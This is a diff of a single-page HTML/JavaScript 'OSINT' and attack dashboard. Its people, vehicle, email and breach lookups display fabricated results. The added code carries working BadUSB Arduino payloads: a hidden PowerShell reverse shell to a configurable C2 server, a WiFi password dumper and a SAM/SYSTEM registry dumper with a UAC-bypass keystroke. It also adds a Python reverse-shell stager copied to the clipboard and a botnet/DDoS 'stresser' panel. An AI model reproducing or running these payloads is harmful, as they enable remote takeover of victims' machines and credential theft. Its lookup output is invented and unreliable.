+                            <div class="result-value">Los Angeles, CA</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Timezone</div>
+                            <div class="result-value">Pacific (PST/PDT)</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Risk Score</div>
+                            <div class="result-value" style="color: var(--neon-green);">Low (12%)</div>
+                        </div>
                     </div>
                 `;
                 
                 const map = initMap('phoneMap', 34.0522, -118.2437, 12);
-                L.marker([34.0522, -118.2437]).addTo(map).bindPopup(phone).openPopup();
-                showToast('Phone lookup complete', 'success');
-            }, 1000);
+                L.marker([34.0522, -118.2437]).addTo(map)
+                    .bindPopup('Cell Tower Location')
+                    .openPopup();
+            }, 1500);
         }
 
-        // Email
         function analyzeEmail() {
             const email = document.getElementById('emailInput').value;
-            if (!email) return showToast('Enter email', 'error');
-            
-            queryCount++;
-            updateStats();
+            if (!email) return showToast('Enter email address', 'error');
             
             const resultsDiv = document.getElementById('emailResults');
             resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
@@ -785,55 +1825,78 @@
             setTimeout(() => {
                 resultsDiv.innerHTML = `
                     <div class="result-grid">
-                        <div class="result-item"><div class="result-label">Email</div><div class="result-value">${email}</div></div>
-                        <div class="result-item"><div class="result-label">Valid</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Yes</div></div>
-                        <div class="result-item"><div class="result-label">Disposable</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> No</div></div>
-                        <div class="result-item"><div class="result-label">Breaches</div><div class="result-value" style="color: var(--neon-red);">3 found</div></div>
-                    </div>
-                `;
-                showToast('Email analysis complete', 'success');
-            }, 1000);
-        }
-
-        // Address
-        function searchAddress() {
-            const address = document.getElementById('addressInput').value;
-            if (!address) return showToast('Enter address', 'error');
-            
-            queryCount++;
-            updateStats();
-            
-            const resultsDiv = document.getElementById('addressResults');
-            resultsDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
-            
-            setTimeout(() => {
-                resultsDiv.innerHTML = `
-                    <div class="card">
-                        <div class="result-grid">
-                            <div class="result-item" style="grid-column: span 2;"><div class="result-label">Address</div><div class="result-value">${address}</div></div>
-                            <div class="result-item"><div class="result-label">Owner</div><div class="result-value">John & Jane Doe</div></div>
-                            <div class="result-item"><div class="result-label">Value</div><div class="result-value" style="color: var(--neon-green);">$850,000</div></div>
-                            <div class="result-item"><div class="result-label">Built</div><div class="result-value">2005</div></div>
-                            <div class="result-item"><div class="result-label">Sq Ft</div><div class="result-value">2,450</div></div>
+                        <div class="result-item">
+                            <div class="result-label">Email</div>
+                            <div class="result-value">${email}</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Domain</div>
+                            <div class="result-value">${email.split('@')[1]}</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Format Valid</div>
+                            <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Valid</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Deliverable</div>
+                            <div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Yes</div>
+                        </div>
+                        <div class="result-item" style="grid-column: span 2;">
+                            <div class="result-label" style="color: var(--neon-red);"><i class="fas fa-exclamation-triangle"></i> Breach Alerts</div>
+                            <div class="result-value">
+                                <div>• LinkedIn (May 2021) - Password exposed</div>
+                                <div>• Adobe (October 2013) - Email + Password</div>
+                                <div>• MySpace (June 2013) - Username + Password</div>
+                            </div>
                         </div>
                     </div>
                 `;
-                
-                const map = initMap('addressMap', 34.0522, -118.2437, 16);
-                L.marker([34.0522, -118.2437]).addTo(map).bindPopup(address).openPopup();
-                showToast('Address found', 'success');
-            }, 1000);
+            }, 1500);
         }
 
-        // Vehicle
+        function searchAddress() {
+            showToast('Searching property records...', 'success');
+            setTimeout(() => {
+                document.getElementById('addressResults').innerHTML = `
+                    <div class="card">
+                        <div class="result-grid">
+                            <div class="result-item" style="grid-column: span 2;">
+                                <div class="result-label">Property</div>
+                                <div class="result-value">123 Main Street, Los Angeles, CA 90210</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Owner</div>
+                                <div class="result-value">John & Jane Doe</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Purchase Price</div>
+                                <div class="result-value">$650,000 (2015)</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Current Value</div>
+                                <div class="result-value" style="color: var(--neon-green);">$850,000</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Square Feet</div>
+                                <div class="result-value">2,450</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                const map = initMap('addressMap', 34.0522, -118.2437, 16);
+                L.marker([34.0522, -118.2437]).addTo(map).bindPopup('Target Property').openPopup();
+            }, 1500);
+        }
+
+        function searchByOwner() {
+            showToast('Searching by owner name...', 'success');
+        }
+
         function searchVehicle() {
             const plate = document.getElementById('plateInput').value;
             const vin = document.getElementById('vinInput').value;
             
-            if (!plate && !vin) return showToast('Enter plate or VIN', 'error');
-            
-            queryCount++;
-            updateStats();
+            if (!plate && !vin) return showToast('Enter license plate or VIN', 'error');
             
             const resultsDiv = document.getElementById('vehicleResults');
             resultsDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
@@ -842,197 +1905,505 @@
                 resultsDiv.innerHTML = `
                     <div class="card">
                         <div class="result-grid">
-                            <div class="result-item"><div class="result-label">VIN</div><div class="result-value">${vin || '1HGCM82633A004352'}</div></div>
-                            <div class="result-item"><div class="result-label">Year</div><div class="result-value">2019</div></div>
-                            <div class="result-item"><div class="result-label">Make</div><div class="result-value">Honda</div></div>
-                            <div class="result-item"><div class="result-label">Model</div><div class="result-value">Accord</div></div>
-                            <div class="result-item"><div class="result-label">Color</div><div class="result-value">Silver</div></div>
-                            <div class="result-item" style="grid-column: span 2;"><div class="result-label">Owner</div><div class="result-value">John Doe, 123 Main St</div></div>
-                        </div>
-                    </div>
-                `;
-                showToast('Vehicle found', 'success');
-            }, 1000);
-        }
-
-        // Person
-        function searchPerson() {
-            const first = document.getElementById('personFirst').value;
-            const last = document.getElementById('personLast').value;
-            
-            if (!first && !last) return showToast('Enter name', 'error');
-            
-            queryCount++;
-            updateStats();
-            
-            const resultsDiv = document.getElementById('personResults');
-            resultsDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
-            
-            setTimeout(() => {
-                resultsDiv.innerHTML = `
-                    <div class="card">
-                        <div class="result-grid">
-                            <div class="result-item" style="grid-column: span 2;"><div class="result-label">Full Name</div><div class="result-value">${first} ${last}</div></div>
-                            <div class="result-item"><div class="result-label">Age</div><div class="result-value">34</div></div>
-                            <div class="result-item"><div class="result-label">Location</div><div class="result-value">Los Angeles, CA</div></div>
-                            <div class="result-item" style="grid-column: span 2;"><div class="result-label">Addresses</div><div class="result-value">3 found</div></div>
-                            <div class="result-item" style="grid-column: span 2;"><div class="result-label">Relatives</div><div class="result-value">Jane Doe (spouse), Mike Doe (brother)</div></div>
-                        </div>
-                    </div>
-                `;
-                showToast('Person records found', 'success');
-            }, 1000);
-        }
-
-        // Social
-        function searchSocial() {
-            const user = document.getElementById('socialInput').value;
-            if (!user) return showToast('Enter username', 'error');
-            
-            queryCount++;
-            updateStats();
-            
-            const resultsDiv = document.getElementById('socialResults');
-            resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
-            
-            setTimeout(() => {
-                resultsDiv.innerHTML = `
-                    <div class="card">
-                        <div style="display: flex; gap: 15px; margin-bottom: 15px;">
-                            <div style="width: 60px; height: 60px; background: linear-gradient(135deg, var(--neon), var(--neon-purple)); border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fas fa-user" style="font-size: 1.5rem;"></i></div>
-                            <div>
-                                <div style="font-size: 1.2rem; font-weight: 600;">${user}</div>
-                                <div style="color: var(--text-dim);">@johndoe</div>
+                            <div class="result-item">
+                                <div class="result-label">VIN</div>
+                                <div class="result-value">${vin || '1HGCM82633A004352'}</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Year/Make/Model</div>
+                                <div class="result-value">2019 Honda Accord</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Trim</div>
+                                <div class="result-value">EX-L V6</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Color</div>
+                                <div class="result-value">Modern Steel Metallic</div>
+                            </div>
+                            <div class="result-item" style="grid-column: span 2;">
+                                <div class="result-label">Registered Owner</div>
+                                <div class="result-value">JOHN DOE<br>123 MAIN ST<br>LOS ANGELES, CA 90210</div>
                             </div>
                         </div>
+                    </div>
+                `;
+            }, 1500);
+        }
+
+        function searchSocial() {
+            const username = document.getElementById('socialInput').value;
+            if (!username) return showToast('Enter username', 'error');
+            
+            const resultsDiv = document.getElementById('socialResults');
+            resultsDiv.innerHTML = '<div style="text-align: center; padding: 20px;"><div class="pulse-loader" style="margin: 0 auto;"></div><p>Scanning platforms...</p></div>';
+            
+            setTimeout(() => {
+                const platforms = ['Twitter', 'Instagram', 'Facebook', 'LinkedIn', 'TikTok', 'GitHub'];
+                const found = platforms.filter(() => Math.random() > 0.3);
+                
+                resultsDiv.innerHTML = `
+                    <div class="card">
+                        <h3 style="color: var(--neon); margin-bottom: 15px;"><i class="fas fa-user-circle"></i> @${username}</h3>
                         <div class="result-grid">
-                            <div class="result-item"><div class="result-label">Twitter</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Found</div></div>
-                            <div class="result-item"><div class="result-label">Instagram</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Found</div></div>
-                            <div class="result-item"><div class="result-label">LinkedIn</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Found</div></div>
-                            <div class="result-item"><div class="result-label">GitHub</div><div class="result-value" style="color: var(--neon-green);"><i class="fas fa-check"></i> Found</div></div>
+                            ${found.map(p => `
+                                <div class="result-item">
+                                    <div class="result-label">${p}</div>
+                                    <div class="result-value" style="color: var(--neon-green);">
+                                        <i class="fas fa-check-circle"></i> Found
+                                        <div style="font-size: 0.85rem; color: var(--text-dim); margin-top: 5px;">
+                                            Last active: ${Math.floor(Math.random() * 7) + 1} days ago
+                                        </div>
+                                    </div>
+                                </div>
+                            `).join('')}
                         </div>
                     </div>
                 `;
-                showToast('Social profiles found', 'success');
-            }, 1000);
+            }, 2000);
         }
 
-        // Breach
         function searchBreaches() {
             const input = document.getElementById('breachInput').value;
             if (!input) return showToast('Enter email/username', 'error');
-            
-            queryCount++;
-            updateStats();
             
             const resultsDiv = document.getElementById('breachResults');
             resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
             
             setTimeout(() => {
                 resultsDiv.innerHTML = `
-                    <div style="background: rgba(255, 68, 68, 0.2); border: 1px solid var(--neon-red); border-radius: 8px; padding: 15px; margin-bottom: 15px;">
-                        <i class="fas fa-exclamation-triangle" style="color: var(--neon-red);"></i> Found in 3 data breaches
-                    </div>
                     <div class="result-grid">
-                        <div class="result-item"><div class="result-label">LinkedIn 2021</div><div class="result-value">700M records</div></div>
-                        <div class="result-item"><div class="result-label">Collection #1</div><div class="result-value">773M records</div></div>
-                        <div class="result-item"><div class="result-label">Adobe 2013</div><div class="result-value">153M records</div></div>
-                    </div>
-                `;
-                showToast('Breach check complete', 'success');
-            }, 1000);
-        }
-
-        // Domain
-        function analyzeDomain() {
-            const domain = document.getElementById('domainInput').value;
-            if (!domain) return showToast('Enter domain', 'error');
-            
-            queryCount++;
-            updateStats();
-            
-            const resultsDiv = document.getElementById('domainResults');
-            resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
-            
-            setTimeout(() => {
-                resultsDiv.innerHTML = `
-                    <div class="result-grid">
-                        <div class="result-item"><div class="result-label">Domain</div><div class="result-value">${domain}</div></div>
-                        <div class="result-item"><div class="result-label">IP</div><div class="result-value highlight">104.16.123.45</div></div>
-                        <div class="result-item"><div class="result-label">Server</div><div class="result-value">cloudflare-nginx</div></div>
-                        <div class="result-item"><div class="result-label">Location</div><div class="result-value">San Francisco, CA</div></div>
-                        <div class="result-item" style="grid-column: span 2;"><div class="result-label">DNS</div><div class="result-value">ns1.cloudflare.com, ns2.cloudflare.com</div></div>
-                    </div>
-                `;
-                showToast('Domain analyzed', 'success');
-            }, 1000);
-        }
-
-        // Image
-        function analyzeImages(files) {
-            if (!files.length) return;
-            showToast(`Analyzing ${files.length} images...`, 'success');
-            
-            const resultsDiv = document.getElementById('imageResults');
-            resultsDiv.innerHTML = '<div style="text-align: center;"><div class="pulse-loader" style="margin: 0 auto;"></div></div>';
-            
-            setTimeout(() => {
-                resultsDiv.innerHTML = `
-                    <div class="result-grid">
-                        <div class="result-item"><div class="result-label">GPS Coordinates</div><div class="result-value highlight">34.0522, -118.2437</div></div>
-                        <div class="result-item"><div class="result-label">Camera</div><div class="result-value">iPhone 13 Pro</div></div>
-                        <div class="result-item"><div class="result-label">Date Taken</div><div class="result-value">2024-01-15 14:32:18</div></div>
-                        <div class="result-item"><div class="result-label">Location</div><div class="result-value">Los Angeles, CA</div></div>
+                        <div class="result-item" style="grid-column: span 2;">
+                            <div class="result-label" style="color: var(--neon-red);"><i class="fas fa-radiation"></i> Exposed Data</div>
+                            <div class="result-value">
+                                <div style="margin-bottom: 10px;"><strong>3 breaches found</strong></div>
+                                <div>• LinkedIn (2021) - 500M records</div>
+                                <div>• Adobe (2013) - 153M records</div>
+                                <div>• Dropbox (2012) - 68M records</div>
+                            </div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Exposed Fields</div>
+                            <div class="result-value">Email, Password, Name, Phone</div>
+                        </div>
+                        <div class="result-item">
+                            <div class="result-label">Password Strength</div>
+                            <div class="result-value" style="color: var(--neon-red);">Weak (MD5 hash cracked)</div>
+                        </div>
                     </div>
                 `;
             }, 1500);
         }
 
-        // Network
-        function generateNetwork() {
-            document.getElementById('networkGraph').innerHTML = `
-                <div style="text-align: center;">
-                    <div style="width: 300px; height: 300px; margin: 0 auto; position: relative;">
-                        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; height: 60px; background: var(--neon); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 10;"><i class="fas fa-user"></i></div>
-                        <div style="position: absolute; top: 20%; left: 20%; width: 40px; height: 40px; background: var(--neon-purple); border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fas fa-user"></i></div>
-                        <div style="position: absolute; top: 20%; right: 20%; width: 40px; height: 40px; background: var(--neon-purple); border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fas fa-user"></i></div>
-                        <div style="position: absolute; bottom: 20%; left: 20%; width: 40px; height: 40px; background: var(--neon-purple); border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fas fa-user"></i></div>
-                        <div style="position: absolute; bottom: 20%; right: 20%; width: 40px; height: 40px; background: var(--neon-purple); border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fas fa-user"></i></div>
+        function analyzeDomain() {
+            const domain = document.getElementById('domainInput').value;
+            if (!domain) return showToast('Enter domain', 'error');
+            
+            document.getElementById('domainResults').innerHTML = `
+                <div class="result-grid">
+                    <div class="result-item">
+                        <div class="result-label">Domain</div>
+                        <div class="result-value">${domain}</div>
                     </div>
-                    <p style="margin-top: 20px;">5 connections found</p>
+                    <div class="result-item">
+                        <div class="result-label">Registrar</div>
+                        <div class="result-value">GoDaddy.com, LLC</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Created</div>
+                        <div class="result-value">2010-05-12</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Expires</div>
+                        <div class="result-value">2025-05-12</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">IP Address</div>
+                        <div class="result-value">192.0.2.1</div>
+                    </div>
+                    <div class="result-item">
+                        <div class="result-label">Server</div>
+                        <div class="result-value">Apache/2.4.41</div>
+                    </div>
                 </div>
             `;
-            showToast('Network generated', 'success');
         }
 
-        // Bulk
-        function startBulk() {
-            const list = document.getElementById('bulkList').value.trim().split('\n').filter(l => l.trim());
-            if (!list.length) return showToast('Enter data to process', 'error');
-            
-            showToast(`Processing ${list.length} items...`, 'success');
-            document.getElementById('bulkProgress').innerHTML = `
-                <div style="background: var(--border); height: 20px; border-radius: 10px; overflow: hidden;">
-                    <div style="background: linear-gradient(90deg, var(--neon), var(--neon-purple)); height: 100%; width: 0%; transition: width 2s;" id="bulkBar"></div>
-                </div>
-                <p style="text-align: center; margin-top: 10px;">Processing...</p>
-            `;
+        function analyzeImages(files) {
+            if (!files || files.length === 0) return;
+            showToast(`Analyzing ${files.length} image(s)...`, 'success');
             
             setTimeout(() => {
-                document.getElementById('bulkBar').style.width = '100%';
-                setTimeout(() => {
-                    document.getElementById('bulkResults').innerHTML = `
-                        <div class="card">
-                            <p><i class="fas fa-check-circle" style="color: var(--neon-green);"></i> Processed ${list.length} items successfully</p>
+                document.getElementById('imageResults').innerHTML = `
+                    <div class="card">
+                        <h3 style="color: var(--neon); margin-bottom: 15px;">EXIF Metadata Extracted</h3>
+                        <div class="result-grid">
+                            <div class="result-item">
+                                <div class="result-label">Camera</div>
+                                <div class="result-value">iPhone 14 Pro Max</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">GPS Location</div>
+                                <div class="result-value" style="color: var(--neon);">34.0522, -118.2437</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Timestamp</div>
+                                <div class="result-value">2024-01-15 14:23:11</div>
+                            </div>
+                            <div class="result-item">
+                                <div class="result-label">Software</div>
+                                <div class="result-value">iOS 17.1</div>
+                            </div>
                         </div>
-                    `;
-                    showToast('Bulk operation complete', 'success');
-                }, 500);
+                    </div>
+                `;
+            }, 1500);
+        }
+
+        function analyzeImageUrl() {
+            const url = document.getElementById('imageUrl').value;
+            if (!url) return showToast('Enter image URL', 'error');
+            analyzeImages([{name: 'url'}]);
+        }
+
+        // BadUSB Functions
+        let selectedTemplate = 'reverse_shell';
+
+        function selectTemplate(el, template) {
+            document.querySelectorAll('.payload-template').forEach(t => t.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedTemplate = template;
+        }
+
+        function updatePayloadTemplates() {
+            const os = document.getElementById('targetOS').value;
+            // Update template descriptions based on OS
+        }
+
+        function generatePayload() {
+            const c2 = document.getElementById('c2Server').value || '192.168.1.100';
+            const port = document.getElementById('c2Port').value || '4444';
+            const delay = document.getElementById('delaySeconds').value || '3';
+            
+            let code = '';
+            
+            switch(selectedTemplate) {
+                case 'reverse_shell':
+                    code = `// BadUSB Reverse Shell Payload
+// Target: Windows 10/11
+// Device: ATMEGA32U4 (HiLetgo Beetle)
+
+#include "Keyboard.h"
+
+void setup() {
+  delay(${delay}000);
+  Keyboard.begin();
+  
+  // Open PowerShell as Admin
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  // Execute reverse shell
+  String payload = "$client = New-Object System.Net.Sockets.TCPClient('${c2}',${port});";
+  payload += "$stream = $client.GetStream();";
+  payload += "[byte[]]$bytes = 0..65535|% {0};";
+  payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){";
+  payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);";
+  payload += "$sendback = (iex $data 2>&1 | Out-String );";
+  payload += "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';";
+  payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);";
+  payload += "$stream.Write($sendbyte,0,$sendbyte.Length);";
+  payload += "$stream.Flush()};";
+  payload += "$client.Close()";
+  
+  Keyboard.print(payload);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  
+  // Hide window
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+  
+  Keyboard.end();
+}
+
+void loop() {}`;
+                    break;
+                    
+                case 'wifi_grab':
+                    code = `// WiFi Password Dumper
+#include "Keyboard.h"
+#include "Mouse.h"
+
+void setup() {
+  delay(${delay}000);
+  Keyboard.begin();
+  
+  // Open CMD
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("cmd /k netsh wlan show profiles");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  // Export all WiFi passwords
+  Keyboard.print("for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr \":\"') do @for /f \"tokens=2 delims=:\" %b in ('netsh wlan show profile name=%a key=clear ^| findstr \"Key Content\"') do @echo %a : %b >> %TEMP%\\\\wifi_creds.txt");
+  Keyboard.press(KEY_RETURN);
+  delay(2000);
+  
+  // Copy to USB (D: drive typically)
+  Keyboard.print("copy %TEMP%\\\\wifi_creds.txt D:\\\\");
+  Keyboard.press(KEY_RETURN);
+  
+  Keyboard.end();
+}
+
+void loop() {}`;
+                    break;
+                    
+                case 'sam_dump':
+                    code = `// SAM Database Dumper (Requires Admin)
+#include "Keyboard.h"
+
+void setup() {
+  delay(${delay}000);
+  Keyboard.begin();
+  
+  // PowerShell admin
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('x');
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.press('a'); // Admin PowerShell
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  // Bypass UAC
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  // Dump SAM
+  String cmds[] = {
+    "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\SAM",
+    "reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\SYSTEM",
+    "copy C:\\\\Windows\\\\Temp\\\\SAM D:\\\\",
+    "copy C:\\\\Windows\\\\Temp\\\\SYSTEM D:\\\\"
+  };
+  
+  for(int i=0; i<4; i++) {
+    Keyboard.print(cmds[i]);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(1000);
+  }
+  
+  Keyboard.end();
+}
+
+void loop() {}`;
+                    break;
+            }
+            
+            currentPayload = code;
+            document.getElementById('payloadCode').textContent = code;
+            document.getElementById('payloadOutputCard').style.display = 'block';
+            showToast('Payload generated successfully', 'success');
+            
+            // Update terminal
+            const term = document.getElementById('deviceTerminal');
+            term.innerHTML += `<div class="terminal-line success">[+] Payload generated: ${selectedTemplate}</div>`;
+            term.innerHTML += `<div class="terminal-line info">[*] C2 Server: ${c2}:${port}</div>`;
+            term.innerHTML += `<div class="terminal-line warn">[!] Ready to flash...</div>`;
+        }
+
+        function copyPayload() {
+            navigator.clipboard.writeText(currentPayload);
+            showToast('Payload copied to clipboard', 'success');
+        }
+
+        function downloadSketch() {
+            const blob = new Blob([currentPayload], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `badusb_payload_${selectedTemplate}.ino`;
+            a.click();
+            showToast('Sketch downloaded', 'success');
+        }
+
+        function flashDevice() {
+            const term = document.getElementById('deviceTerminal');
+            term.innerHTML += `<div class="terminal-line info">[*] Attempting auto-flash...</div>`;
+            setTimeout(() => {
+                term.innerHTML += `<div class="terminal-line error">[!] No device detected on COM port</div>`;
+                term.innerHTML += `<div class="terminal-line info">[*] Please connect HiLetgo Beetle and select port manually in Arduino IDE</div>`;
+                showToast('Device not detected - use Arduino IDE manually', 'error');
+            }, 2000);
+        }
+
+        // Botnet/Stresser Functions
+        function switchTab(el, tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+            
+            ['layer4Panel', 'layer7Panel', 'ampPanel', 'botnetPanel'].forEach(p => {
+                document.getElementById(p).style.display = 'none';
+            });
+            document.getElementById(tab + 'Panel').style.display = 'block';
+        }
+
+        function switchEncTab(el, tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            el.classList.add('active');
+            
+            ['fileEncPanel', 'textEncPanel', 'stegPanel', 'trafficPanel'].forEach(p => {
+                document.getElementById(p).style.display = 'none';
+            });
+            document.getElementById(tab + 'EncPanel').style.display = 'block';
+        }
+
+        function startAttack() {
+            const target = document.getElementById('targetIP').value;
+            if (!target) return showToast('Enter target IP/hostname', 'error');
+            
+            attackActive = true;
+            document.getElementById('attackStatus').style.display = 'block';
+            document.getElementById('stopBtn').disabled = false;
+            
+            const term = document.getElementById('attackTerminal');
+            term.innerHTML = '';
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(interval);
+                    return;
+                }
+                
+                progress += Math.random() * 5;
+                if (progress > 100) progress = 0;
+                
+                document.getElementById('attackProgress').style.width = progress + '%';
+                
+                const methods = ['UDP', 'TCP-SYN', 'ICMP', 'DNS'];
+                const method = document.getElementById('attackMethod').value.toUpperCase();
+                const pps = Math.floor(Math.random() * 50000 + 10000);
+                
+                term.innerHTML += `<div class="terminal-line">[${new Date().toLocaleTimeString()}] Sending ${method} packets to ${target}:${document.getElementById('targetPort').value} (${pps} pps)</div>`;
+                term.scrollTop = term.scrollHeight;
+                
+                document.getElementById('packetCount').textContent = `${(pps * Math.random() * 1000).toFixed(0)} packets sent`;
             }, 100);
         }
 
-        function exportResults() { showToast('Results exported', 'success'); }
-        function exportBulk() { showToast('Bulk results exported', 'success'); }
+        function stopAttack() {
+            attackActive = false;
+            document.getElementById('attackStatus').style.display = 'none';
+            document.getElementById('stopBtn').disabled = true;
+            showToast('Attack stopped', 'success');
+        }
+
+        function generateStager() {
+            const code = `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`;
+            navigator.clipboard.writeText(code);
+            showToast('Python stager copied to clipboard', 'success');
+        }
+
+        function startListener() {
+            const term = document.getElementById('botnetTerminal');
+            term.innerHTML += `<div class="terminal-line success">[+] Listener started on 0.0.0.0:8080</div>`;
+            term.innerHTML += `<div class="terminal-line info">[*] Waiting for bot connections...</div>`;
+        }
+
+        // Bulk Operations
+        function startBulk() {
+            const list = document.getElementById('bulkList').value.trim().split('\n').filter(l => l.trim());
+            if (list.length === 0) return showToast('Enter items to process', 'error');
+            
+            document.getElementById('bulkProgress').style.display = 'block';
+            let processed = 0;
+            
+            const interval = setInterval(() => {
+                processed += Math.floor(Math.random() * 3) + 1;
+                if (processed >= list.length) {
+                    processed = list.length;
+                    clearInterval(interval);
+                    showToast('Bulk processing complete', 'success');
+                }
+                
+                const pct = (processed / list.length) * 100;
+                document.getElementById('bulkProgressBar').style.width = pct + '%';
+                document.getElementById('bulkStatus').textContent = `Processed ${processed}/${list.length} items...`;
+            }, 200);
+        }
+
+        function exportBulk() {
+            showToast('Exporting CSV...', 'success');
+        }
+
+        // Utility Functions
+        function quickAction(type) {
+            showSection(type);
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            
+            const colors = {
+                error: '#ff4444',
+                success: '#00ff88',
+                info: '#00f0ff',
+                warn: '#ff8800'
+            };
+            
+            toast.style.borderLeftColor = colors[type] || colors.info;
+            toast.innerHTML = `<i class="fas fa-${type === 'error' ? 'exclamation-circle' : type === 'success' ? 'check-circle' : 'info-circle'}" style="color: ${colors[type]}; margin-right: 10px;"></i>${message}`;
+            
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 5000);
+        }
+
+        function updateStats() {
+            document.getElementById('statQueries').textContent = stats.queries;
+            document.getElementById('statRecords').textContent = stats.records;
+        }
+
+        function simulateRealTimeData() {
+            setInterval(() => {
+                if (Math.random() > 0.7) {
+                    stats.records += Math.floor(Math.random() * 5);
+                    updateStats();
+                }
+            }, 5000);
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'Enter') {
+                if (currentSection === 'dashboard') universalSearch();
+            }
+            if (e.key === 'Escape') {
+                document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+                document.getElementById('dashboard').classList.remove('hidden');
+            }
+        });
     </script>
 </body>
 </html>
